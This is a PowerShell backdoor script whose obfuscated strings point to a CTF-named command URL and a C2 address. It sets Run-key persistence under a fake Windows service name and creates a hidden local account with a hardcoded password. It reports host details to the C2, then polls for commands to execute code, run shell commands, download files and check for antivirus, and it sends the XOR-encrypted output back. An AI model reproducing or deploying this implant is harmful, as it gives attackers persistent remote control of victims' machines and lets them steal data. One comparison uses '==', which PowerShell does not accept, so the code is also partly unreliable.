$SF = Join-Path $env:APPDATA "Windows" "CurrentVersion"
$U = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3hhbnR1czEwLmdpdGh1Yi5pby9DVEYvbWl0cmUvY2MudHh0"));
$CC = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovLzEwLjE1MC4wLjk5Lw=="));
$LASTCOM = ""
$KEY = "era8!!a8wRRQ7t*u"
$INITFN = Join-Path $SF "win.ini"

######### Init Setup
if (-not (Test-Path $INITFN)) {
  New-Item -Path $INITFN -ItemType File
  $rp = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"))
  $rn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTG9nb25JbnRTZXJ2aWNl"))
  $tf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezYyMEUwREZGLTFBQzItNDVBRi04MUU5LURBMDE2OEQxRUFCNH0="))
  $tfp = Join-Path $SF $tf
  $rv = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIC9jIHR5cGUg")) + $tfp + [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IHwgcG93ZXJzaGVsbA=="))
  Set-ItemProperty -Path $rp -Name $rn -Value $rv

  $un = -join (68,101,102,97,117,108,116,83,121,115,116,101,109 | ForEach-Object { [char]$_ })
  $pw = -join (77,49,55,55,42,51,97,84,55,64,91,75 | ForEach-Object { [char]$_ })

  try {
      if (-not (Get-LocalUser -Name $un -ErrorAction SilentlyContinue)) {

          net user $un $pw /add /comment:"Default account for NT/SYSTEM tasks."
      }
  }
  catch {}
}

######### Functionality
function Enc {
  param (
    [string] $s
  )
  $inpb = [System.Text.Encoding]::UTF8.GetBytes($s)
  $kb = [System.Text.Encoding]::UTF8.GetBytes($KEY)

  $out = New-Object byte[] $inpb.Length

  for ($i = 0; $i -lt $inpb.Length; $i++) {
    $out[$i] = $inpb[$i] -bxor $kb[$i % $kb.Length]
  }

  return [System.Convert]::ToBase64String($out);
}

function ExToCC {
  param (
    [string] $cont
  )
  $e = Enc $cont
  $body = @{
    cont = $e
  } | ConvertTo-Json
  Invoke-WebRequest -Uri $CC -Method Post -ContentType "application/json" -Body $body
}

function JoinCC {
  $hstnm = $env:COMPUTERNAME
  $usrnm = $env:USERNAME
  $ipaddr = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceOperationalStatus Up | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1 -ExpandProperty IPAddress)
  $msg = "JOIN BY: " + $hstnm + " - " + $usrnm + " - " + $ipaddr
  ExToCC $msg
}

function ComExec {
  param (
    [string] $c
  )
  $output = Invoke-Expression $c | Out-String
  return $output
}

function ComDnld {
  param (
    [string] $DnldUrl
  )
  $dir = Join-Path $SF "tools"
  if (-not (Test-Path $dir)) {
    New-Item -ItemType Directory -Path $dir | Out-Null
  }
  $fn = [System.IO.Path]::GetFileName($DnldUrl)
  $ofp = Join-Path $dir $fn

  Invoke-WebRequest -Uri $DnldUrl -OutFile $ofp
}

function ComRunCmd {
  param (
    [string] $cmdline
  )
  
  $out = cmd.exe /c $cmdline 2>&1 | Out-String
  return $out
}

function ComDisc {
  $ulst = Get-LocalUser | Select-Object -ExpandProperty Name
  $avchk = "NOT PRESENT"
  if (Get-Process -Name "avp" -ErrorAction SilentlyContinue) {
    $avchk = "PRESENT"
  }
  return "DISC COM OUT`r`n" + $ulst + "`r`nAV: " + $avchk
}

function ReqCommand {
  $res = Invoke-WebRequest -Uri $U -UseBasicParsing
  $cont = $res.Content
  if ($cont == $global:LASTCOM) {return}
  $global:LASTCOM = $cont
  $parts = $cont -split ":", 2
  $com = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[0]))
  $arg = if ($parts.Count -gt 1) { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[1])) } else { "" }
  switch ($com) {
    "invexp" {
      $out = ComExec $arg
      ExToCC $out
    }
    "chngkey" {
      $global:KEY = $arg
    }
    "dnld" {
      ComDnld $arg
    }
    "runcmd" {
      $out = ComRunCmd $arg
      ExToCC $out
    }
    "disc" {
      $out = ComDisc
      ExToCC $out
    }
    default {}
  }
}

JoinCC
while ($true) {
  try {
    ReqCommand
    Start-Sleep -Seconds 60
  }
  catch {}
}
